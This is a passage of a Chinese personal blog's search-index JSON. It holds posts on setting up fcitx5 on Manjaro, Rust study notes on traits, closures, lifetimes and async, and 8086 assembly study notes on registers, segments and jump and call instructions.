","date":"2020-01-10","objectID":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/:2:0","tags":["Manjaro"],"title":"fcitx5安装","uri":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"配置 添加一下内容到~/.pam_environment INPUT_METHOD DEFAULT=fcitx5 GTK_IM_MODULE DEFAULT=fcitx5 QT_IM_MODULE DEFAULT=fcitx5 XMODIFIERS DEFAULT=\\@im=fcitx5 ","date":"2020-01-10","objectID":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/:3:0","tags":["Manjaro"],"title":"fcitx5安装","uri":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"设置开机自启动 实测在 kde 环境下不会自动启动，执行以下命令即可自启动 cp /usr/share/applications/fcitx5.desktop ~/.config/autostart/ 也可以直接在系统设置模块-自动启动设置 ","date":"2020-01-10","objectID":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/:4:0","tags":["Manjaro"],"title":"fcitx5安装","uri":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"rime 设置（双拼等） 在~/.local/share/fcitx5/rime/中 parse 下面 github 中的文件 https://github.com/jesse996/squirrel_config ","date":"2020-01-10","objectID":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/:5:0","tags":["Manjaro"],"title":"fcitx5安装","uri":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"皮肤 修改皮肤：传送门 ","date":"2020-01-10","objectID":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/:6:0","tags":["Manjaro"],"title":"fcitx5安装","uri":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"单行模式 单行模式就是输入时没有候选子上面的拼音。 在设置中，启用“ 在程序中显示预编辑文本 ”即可启用单行模式 ","date":"2020-01-10","objectID":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/:7:0","tags":["Manjaro"],"title":"fcitx5安装","uri":"/2020/01/fcitx5%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"不是每个 trait 都可以作为 tarit 对象被使用，这和类型大小是否确认有关。每个 trait 都包含一个隐式的类型参数 Self，代表实现该 tarit 的实际类型。Self 默认有一个隐式的 tarit 限定?Sized，形如 Self:?Sized。?Sized trait 包含了所有的动态大小类型金额所有的可确定大小的类型。Rust 中大多数类型都是可确定的，就是\u003cT:Sized\u003e。 必须满足下面 2 条规则才可以当作 trait 对象使用： trait 的 Self 不能被限定为 Sized。 trait 中所有的方法都必须是对象安全的。 而对象安全的方法必须满足一下三点之一： 方法受 Self：Sized 约束 方法签名同时满足以下三点： （1）必须不包含任何泛型参数。 （2）第一个参数必须为 Self 类型或可以解引用为 Self 的类型 （3）Self 不能出现在第一个参数以外的地方，包括返回值 trait 中不能包含关联常量。 在实践中，只涉及到两条规则。如果一个 trait 中所有的方法有如下属性时，则该 trait 是对象安全的： 返回值类型不为 Self 方法没有任何泛型类型参数 每个文件定义一个模块。lib.rs 定义了一个和自己 crate 同名的模块；一个 mod.rs 定义了一个它所在文件夹名字的模块；其他的每个文件定义了一个同文件名的模块。 二进制 crate 的 root 必须是 main.rs，库 crate 的 root 必须是 lib.rs 单元测试通常和所测试的代码在同一个文件 集成测试，样例，benchmarks 都必须像其他用户一样导入 crate，只能用公开的 API。 ","date":"2019-12-30","objectID":"/2019/12/rust%E7%AC%94%E8%AE%B0/:0:0","tags":["Rust"],"title":"Rust笔记","uri":"/2019/12/rust%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"闭包 如果闭包中没有捕获任何环境变量，则默认自动实现 Fn 如果闭包中捕获了复制语义类型的环境变量，则 如果不需要修改环境变量，无论是否使用了 move，均会自动实现 Fn 如果需要修改环境变量，则自动实现 FnMut 如果闭包中捕获了移动语义类型的环境变量，则 如果不需要修改，且没有使用 move，则自动实现 FnOnce 如果不需要修改，且使用了 move，则自动实现 Fn 如果需要修改，则自动实现 FnMut 使用 move，如果捕获的变量是复制语义类型的，则闭包本身会自动实现 Copy/Clone,否则不会。 每个闭包表达式都是一个独立的类型，这会有一些不便，如不能把不同的闭包保存到一个数组中，但这可以通过把闭包当做 trait 对象来解决。把闭包放到 Box中就可以构建一个闭包的 trait 对象，然后就可以当做类型来使用， 三者关系： FnOnce-\u003e FnMut -\u003e Fn，即要实现 Fn，必须先实现前面 2 个。 rust 类型分为复制语义和移动语义，复制语义是指分配在栈上，所以复制的时候很简单，直接按位复制，不会出现内存不安全的情况。移动语义指分配在堆上，为了保证内存安全，才有了所有权系统，即一块内存只有有一个变量指向它。 对于复合类型来说，是复制还是移动，取决于其成员的类型，分为 2 种： 结构体，枚举体： 当成员全都是复制语义的时候，复合类型不会自动实现 Copy，要手动实现 Derive(Copy,Clone)，此时复合类型才是复制语义的。如果复合类型中的成员有移动语义的，则无法实现 Copy。 元组，数组，Option：类型会自动实现 Copy，如果元素均为复制语义，则元组就是复制，不需要手动再 Derive(Coyp,Clone)，否则元组就是移动语义的。 共享可变状态是万恶之源 每个 let 都会创建一个默认的词法作用域，这个作用域就是它的生命周期（lifetime），就是在这个词法作用域中存活，出了就死亡。 解引用会获得所有权。 显式生命周期参数是为了解决跨函数借用，编译器无法检查的问题。它只用于编译器的借用检查，来防止垂悬指针。 'b: 'a的意思是 b 的存活时间长于 a 结构体实例的生命周期应短于或等于任意一个成员的生命周期。 生命周期省略规则： 每个输入上对应一个不同的生命周期参数 如果只有一个输入，则输出生命周期等于这个输入的生命周期 如果有 self（\u0026self,\u0026mut self），则输出生命周期等于 self 的生命周期 trait 对象的生命周期默认以下规则： trait 对象的生命周期默认是’static 如果实现 trait 的类型包括\u0026‘a x 或\u0026‘a mut x，则默认生命周期就是’a 如果实现 trait 的类型包含多个类似 T：‘a 的从句，则生命周期需要明确指定 Cell 和 RefCell 的区别： Cell通过 set/get 来直接操作包裹的值，RefCell通过 borrow/borrow_mut。 Cell一般适合复制语义类型，即实现了 Copy，RefCell适合移动语义类型 Cell无运行时开销，不会再运行时 panic，RefCell 则有运行时开销，会 panic 写时复制 Cow Cow是一个枚举体智能指针，包括 2 个可选项： Borrowed：用于包裹引用 Woned：用于包裹所有者 cow 提供的功能是：以不可变的方式访问内容，在需要可变借用或所有权的时候再克隆一份数据。cow 要点： Cow实现了 Deref，所以可以直接调用 T 的不可变方法 在需要修改 T 时，可以使用 to_mut 方法获取可变借用。该方法会克隆，且仅克隆一次。如果 T 本身有所有权，则调用 to_mut 不会发生克隆 在需要修改 T 时，也可以用 into_owned 方法来获取一个拥有所有权的对象。如果 T 是借用类型，则会发生克隆，并创建新的有所有权的对象。如果 T 是所有权对象，则会将所有权转移到新的克隆对象。 Future Trait Future是 rust 异步的核心，代表一个将来会产生值的一个东东。调用poll方法可以让 future 朝着完成进行，如果完成了就返回 Pool::Ready(result)，否则返回Poll::Pending并加到事件循环队列中等待再次被wake方法调用。 Waker Waker 有一个 wake()方法，用来告诉执行器需要执行相关的任务，就会调用相关的 poll 方法。 Executor rust 的 future 都是懒执行的，就是说除非用主动推动完成才会完成，否则不会做任何事。一个推动 future 完成的方法是在 async 方法中用.await，但最外层的 future 如何完成呢？这就需要一个Future executor。 Executor 通过调用poll方法执行一系列最外层的 future。典型的，一旦一个 future 开始了，Executor 就会对之调用 poll 方法。当 future 暗示他们准备好了被调用 wake()更进一步，他们就会被放到队列中等待再次被 poll，不断重复直至完成。 先看看 Executor 的定义: struct Executor { ready_queue: Receiver\u003cArc\u003cTask\u003e\u003e } ","date":"2019-12-30","objectID":"/2019/12/rust%E7%AC%94%E8%AE%B0/:1:0","tags":["Rust"],"title":"Rust笔记","uri":"/2019/12/rust%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"简单的 HashMap 初始化 vec![('d',5),('c',1)].into_iter().collect::\u003cHashMap\u003cchar,i32\u003e\u003e(); fn main(){letsource=\"你好你是谁\";// first find the byte index, then find the corresponding character index // (code point index) // this goes through the source twice though :( letchar_index=source.find(\"你是\").map(|found_byte_index|{source.char_indices().position(|(byte_index,_)|byte_index==found_byte_index).unwrap()});dbg!(char_index);} ","date":"2019-12-30","objectID":"/2019/12/rust%E7%AC%94%E8%AE%B0/:2:0","tags":["Rust"],"title":"Rust笔记","uri":"/2019/12/rust%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"基础知识 汇编语言，有 3 类指令组成： 汇编指令：机器码的助记符，有对应的机器码。 伪指令：没有对应机器码，由编译器执行，计算机并不执行。 其他符号：如+、-、*、\\，由编译器识别，没有对应机器码。 核心是编译指令。每一种 cpu 都有自己的汇编指令集。 存储器就是内存，存储器被划分为多个存储单元，从 0 开始顺序编号，一个存储单元就是一个字节（Byte）。存储器中指令和数据没有任何区别，都是二进制信息。 cpu 有 3 类总线：地址总线、数据总线、控制总线。 一个 cpu 有 n 根地址总线，则可以寻找 2 的 n 次方个内存单元。 n 根数据总线一次能传输 n 位，即 n bit。 控制总线是一些不同控制线的集合，有多少根控制总线，就意味着 cpu 提供了对外部器件的多少种控制。 内存地址空间：对 cpu 来说，系统中的所有存储器中的存储单元都处于一个统一的逻辑存储器中，它的容量受 cpu 寻址能力的限制。这个逻辑存储器即是所说的内存地址空间。 寄存器 一个典型的 cpu 由运算器、控制器、寄存器等器件构成，这些器件靠内部总线相连。前一章说的总线，相对于 cpu 内部来说是外部总线。 不同 cpu，寄存器的个数、结构都不同。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"通用寄存器 8086cpu 所有寄存器都是 16 位。AX、BX、CX、DX 这 4 个寄存器通常用来存放一般性数据，被称为通用寄存器。都可分为类似 AH 和 AL，BH 和 BL… 由于 8086 有 20 位地址总线，但 8086 是 16 位的，即在内部一次性处理、传输、暂时存储的地址只有 16 位，所以 8086 采用在内部用 2 个 16 位地址合成的方法来形成一个 20 位的物理地址。 地址加法器采用 物理地址=段地址x16+偏移地址 来合成物理地址。（也即左移 4 位，也即 x10H）。本质就是基础地址+偏移地址=物理地址。 cpu 可以用不同的段地址和偏移地址形成同一个物理地址。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:1","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"段寄存器 段地址存放在段寄存器中，8086 有 4 个段寄存器：CS、DS、SS、ES CS 和 IP 是 8086 中两个最关键的寄存器，它们共同表示了 cpu 当前要读取指令的地址。CS 为代码段寄存器，IP 为指令指针寄存器。 问：cpu 根据什么将内存中的信息看做是指令？ 答：cpu 将 CS:IP 指向的内存单元中的内容看做是指令。 在 cpu 中，程序员能用指令读写的部件只有寄存器。8086 大部分寄存器的值，都可以用mov来修改，mov称为传送指令。但不能用来设置 CS、IP 的值。 若想修改 CS、IP，可以用jmp指令，形如jmp 段地址：偏移地址。 若仅想修改 IP 的内容，可用形如jmp 某一合法寄存器，如jmp ax，可修改 IP 为 ax 中的值。 mov 可以操作的有：寄存器和寄存器，立即数到寄存器，寄存器和段寄存器，寄存器和内存单元，段寄存器和内存单元 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:2","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"代码段 我们可以根据需要，将一组内存单元定义为一个段。我们可以将长度为 N（N\u003c=64KB，因是 16 位）的一组代码，存在一组地址连续、起始地址为 16 的倍数的内存单元中，从而定义了一个代码段。那么代码段是如何被执行呢？只要将 CS：IP 指向代码段中第一条指令的首地址。 debug 用法 1.查看、修改 cpu 中寄存器的内容：R 2.查看内存中的内容：D 3.修改内存中的内容：E（可以写入数据、命令，无区别） 4.将内存中的内容解释为机器指令和对应的汇编指令：U 5.执行 CS：IP 指向的内存单元的指令：T 6.以汇编指令的形式向内存中写入命令：A 7.G 命令可以直接让 IP 跳到指定位置，如g 0012,会使 IP 跳到 0012 的位置。 8.用 p 命令可以从循环中一次循环完。也可以用 g 命令，直接跳到指定位置。 （T 命令在执行修改寄存器 SS 的指令时，下一条指令也紧接着执行） 寄存器（内存访问） 字单元：存放一个字型数据（16 位）的内存单元，由两个地址连续的内存单元组成。高地址存高位字节，低地址存地位字节。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:3","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"DS 和[address] DS 通常用来存放要访问数据的段地址。 将 10000H 中的数据读到 al 中 : mov bx,1000H mov ds,bx mov al,[0] mov 指令中的[]说明操作对象是一个内存单元,[]中的 0 说明偏移地址是 0，段地址默认是 ds。8086cpu 不支持将数据直接送入段寄存器，而是要用一个寄存器中转，即mov ds,1000H是非法的。 add、sub对段寄存器都是非法的，即add ds,ax,add ds,1,add, ds,[1]都是非法的。 综上，段寄存器的相关操作有: mov 段寄存器，寄存器 mov 寄存器，段寄存器 mov 段寄存器，内存单元 mov 内存单元，段寄存器 即段寄存器可以用 mov 与寄存器和内存单元进行操作（不能与数据），不能用add、sub ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"栈 push入栈，pop 出栈，如push ax,pop ax， SS:SP用来指向栈顶元素。 如图，8086 入栈时，栈顶从高地址向低地址方向增长。因为任意时刻SS：SP指向栈顶，所以当栈为空时，SS：SP指向栈的最底部单元下面的单元。 pop 与 push 相反 8086 不保证我们对栈的操作不会过界，我们只能自己注意。 push 和 pop 操作形式有如下几种: push 寄存器/段寄存器/内存单元 pop 寄存器/段寄存器/内存单元 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"段 段是我们人为规定的。 数据段：段地址放在 DS 中，用 mov、add、sub 等访问内存单元的指令时，cpu 就将我们单一的数据段中的内容当成数据来看。 代码段：段地址放在 CS 中，段中第一条指令的偏移地址放在 IP 中，cpu 将执行指令。 栈段：段地址放在 SS 中，栈顶元素的偏移地址放在 SP 中，cpu 进行站操作如 push、pop 时将栈段当做栈空间操作。 一段内存可以既是代码段又是数据段，又是栈段，也可以都不是。这取决于 CS、IP、SS、SP、DS 的指向。 第一个程序 汇编语言源程序包含两种指令： 1.汇编指令：有对应机器码，可以被编译为机器指令，最终被 cpu 执行。 2.伪指令：没有对应机器码，不被 cpu 执行，由编译器来执行。 assume cs:abc abc segment mov ax,2 add ax,ax add ax,ax mov ax,4c00H int 21H abc ends end segment segment和 ends是一对成对使用的伪指令，是必须要用到的一对伪指令，用来定义一个段，使用格式为： 段名 segment .. 段名 ends 一个汇编程序由多个段组成，这些段用来存放代码、数据或当做栈空间。一个有意义的汇编程序必须要有一个代码段。 end end是会变程序结束的标记，不要搞混end和ends，ends是和segment成对使用的。 assume 这条伪指令含义是“假设”，它假设某一段寄存器和程序的某一个用segment...ends定义的段相关联。只要记住 assume 是将有特定用途的段和相关联的段寄存器关联起来即可。 比如，用cname segment... cname ends定义了一个名为cname的段，在程序开头，用assume cs:cname将cname段和cs联系起来。 程序返回需要使用以下 2 条语句： mov ax,4c00H int 21H ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"loop 作用是循环，cpu 执行 loop 的时候，进行 2 部操作： 1.（cx）=（cx）-1 2.判断 cx 中的值，不为 0 则转到标号处执行，否则向下执行 在汇编源程序中，数据不能以字母开头，所以要在前面加 0。如，9100h 可以直接写为9100h，而 A000h 则要写为0A000h 程序加载后，ds 中存放着程序所在内存的段地址，偏移地址是 0。这个内存区前 256 个字节存放着的是 PSP，DOS 用来和程序进行通信，所以程序的地址可以表示为DS+10H:0 and 是逻辑与命令，or 是逻辑或命令。 大小写转换：一个字母，无论是大小写，将它的第 5 位置 0，就变成大写，第 5 位置 1，就变成小写。 si 和 di 是 8086 中与 bx 功能相近的寄存器，si 和 di 不能分成 2 个 8 位寄存器。 一般来说，在需要暂存数据的时候，我们都应该使用栈。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:1","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"bx，si，di，bp 在 8086 中，只有这 4 个寄存器可以用在[...]中来进行内存单元的寻址。 在[...]中，这 4 个寄存器可以单独出现，或只能以 4 种组合出现： 1.bx 和 si 2.bx 和 di 3.bp 和 si 4.bp 和 di 只要在[...]中使用 bp，而指令中没有显性给出段地址，那么段地址就默认在ss中。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"数据在什么地方？ 1.立即数：在 CPU 的指令缓存器中，如：mov ax,1 2.寄存器：在寄存器中，如：mov ax,bx 3.段地址（SA）和偏移地址（EA），如：mov ax,[0]（段地址默认是ds），mov ax,[bp]（段地址默认是ss） ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"数据有多长？ 数据有 2 种尺寸：byte和word 1.通过寄存器名指明要处理的数据的尺寸。 如指明进行字操作： mov ax,1 mov ds:[0],ax 指明进行字节操作： mov al,1 mov ds:[0],al 2.在没有寄存器名的情况下，用操作符X ptr指明内存单元的长度，X 可以为word或byte。如： 用word ptr指明了指令访问的内存单元是一个字单元： mov word ptr ds:[0],1 inc word ptr [bx] 用byte ptr指明是一个字节单元： mov byte ptr ds:[0],1 inc byte ptr [bx] 3.有些指令默认了访问的是字单元还是字节单元，如，push [1000H]，push 只进行字操作。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"div div 是除指令，要注意一下问题： 除数：8 位和 16 位两种，在一个寄存器或内存单元中。 被除数：默认放在 AX 或 DX 和 AX 中，如果除数为 8 位，被除数位 16 位，默认放在 AX 中；如果除数为 16 位，被除数为 32 位，在 DX 和 AX 中存放，DX 存高 16 位，AX 存低 16 位。 结果：如果除数为 8 位，则 AL 存储除法操作的商，AH 存储除法操作的余数；如果除数为 16 位，则 AX 存放商，DX 存放余数。 格式： div 寄存器 div 内存单元 div byte ptr ds:[0] 含义：（al）=（ax）/（（ds）*16+0）的商 (ah）=（ax）/（（ds）*16+0）的余数 div word ptr es:[0] 含义：（ax）= [（dx）*10000H+（ax）] /（（es））*16+0）的商 （dx）= [（dx）*10000H+（ax）] /（（es））*16+0）的余数 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"伪指令 dd db：用来定义字节型数据 dw：用来定义字型数据 dd：用来定义双字（define double word）型数据 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:8:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"dup dup 是一个操作符，它是和 db，dw，dd 配合使用的。如： db 3 dup (0) 定义了 3 个字节，值都是 0，相当于db 0,0,0 使用格式： db 重复的次数 dup （重复的字节型数据） dw 重复的次数 dup （重复的字型数据） dd 重复的次数 dup （重复的双字型数据） 转移指令的原理 可以修改 IP，或同时修改 CS 和 IP 的指令统称为转移指令。转移指令就是可以控制 cpu 执行内存中某处代码的指令。 8086 的转移行为有以下几类： 只修改 IP，称为段内转移，如：jmp ax 同时修改 CS 和 IP，称为段间转移，如：jmp 1000:0 段内转移又分为短转移和近转移： 短转移 IP 的修改范围为-128~127 近转移 IP 的修改分为为-32768~32767 转移指令有以下几类： 无条件转移（如：jmp） 条件转移 循环转移（如：loop） 过程 中断 这些转移的前提条件可能不同，但原理都相同。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:9:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"offset 由编译器处理，功能是取得标号的偏移地址。 start: mov ax,offset start ;相当于 mov ax,0（0是start的偏移地址） s: mov ax,offset s ;相当于 mov ax,3（3是s的偏移地址） ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:10:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"jmp 指令 jmp 可以只修改 IP，也可以修改同时 CS 和 IP jmp 指令要给出两种信息： 1.转移的目的地址 2.转移的距离 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:11:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"依据位移进行转移的 jmp 指令 jmp short 标号（转到标号处），short 指明是段内短转移（8 位位移），所对应的机器码并不包含转移的目的地址，而是包含的转移的位移 cpu 在指令 jmp 指令的时候，并不需要知道转移的目标地址。 类似的，有jmp near ptr 标号，实现的是段内近转移（16 位位移）。 位移 = 标号处的地址 - jmp 指令后的第一个字节的地址。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:11:1","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"依据转移的目的地址进行转移的 jmp 指令 jmp far ptr 标号实现的是段间转移，又称远转移 功能：（cs）= 标号所在段地址，（ip）= 标号在段中的偏移地址 机器码中有转移的目的地址 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:11:2","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"转移地址在寄存器中的 jmp 指令 格式：jmp 16 位寄存器 功能：（ip）= （16 位寄存器） ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:11:3","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"转移地址在内存中的 jmp 指令 有两种： jmp word ptr 内存单元地址(段内地址) 功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。 如： mov ax,0123H mov [bx],ax jmp word ptr [bx] 执行后，（IP）= 0123H 2.jmp dword ptr 内存单元地址(段内地址) 功能：从内存单元地址处开始存放着两个字，高地址是转移的目的段地址，低地址是转移的目的偏移地址。 如： mov ax,0123H mov [bx],ax mov word ptr [bx+2],0 jmp dword ptr [bx] 执行后，（CS）= 0，（IP）= 0123H 注意：形如 jmp 2000:1000的转移指令，是在 Debug 中使用的汇编指令，汇编编译器并不认识，如在源程序中使用，将编译报错。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:11:4","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"jcxz 指令 为有条件转移指令，所有的有条件转移指令都是短转移，相应机器码都是包含的位移，而不是目的地址。 格式： jcxz 标号（如果（cx）=0，转移到标号处执行） 操作： 当（cx）=0时，（ip）=（ip）+8位位移 相当于 if (cx==0) jmp short 标号 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:12:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"loop 指令 为循环指令，所有的循环指令都是短转移。 格式： loop 标号（（cx）= （cx）-1），如果（cx）!= 0，转移到标号处执行 操作： 1.（cx）=（cx）-1 2.如果（cx）!= 0 ，（ip）=（ip）+8 位位移 相当于： cx--; if (cx!=0) jmp short 标号; call 和 ret 指令 call 和 ret 都是转移指令，都修改 IP，或同时修改 CS 和 IP。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:13:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"ret 和 retf ret 指令用栈中数据，修改 IP 的内容，从而实现近转移 retf 指令用栈中数据，修改 CS 和 IP 的内容，从而实现远转移 执行 ret 指令时，cpu 执行以下 2 部操作： ip=ss*10H+sp sp=sp+2 相当于pop ip 执行 retf 指令时，进行下面 4 部操作： ip=ss*10H+sp sp=sp+2 cs=ss*10H+sp sp=sp+2 相当于pop ip ;pop cs ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:13:1","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"call 指令 执行 call 指令时，进行 2 部操作： 将当前 ip 或 cs 和 ip 压栈 转移 call 不能实现短转移，除此之外，call 实现转移的方法和 jmp 相同: call 标号：将当前 ip 压栈后，转到标号处执行,相当于： push ip jmp near ptr 标号 call far ptr 标号：实现段间转移,相当于： push cs push ip jmp far ptr 标号 call 16位寄存器：相当于： push ip jmp 16位寄存器 call word ptr 内存单元地址,相当于： push ip jmp word ptr 内存单元地址 call dword ptr 内存单元地址,相当于： push cs push ip jmp dword ptr 内存单元地址 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:13:2","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"mul 指令 mul 是乘法指令，要注意以下两点： 两个相乘的数：要么都是 8 位，要么都是 16 位。如果是 8 位，一个放在 al，一个放在 8 位寄存器或内存字节单元中；若是 16 位，一个在 ax，一个在 16 位寄存器中。 结果：如果是 8 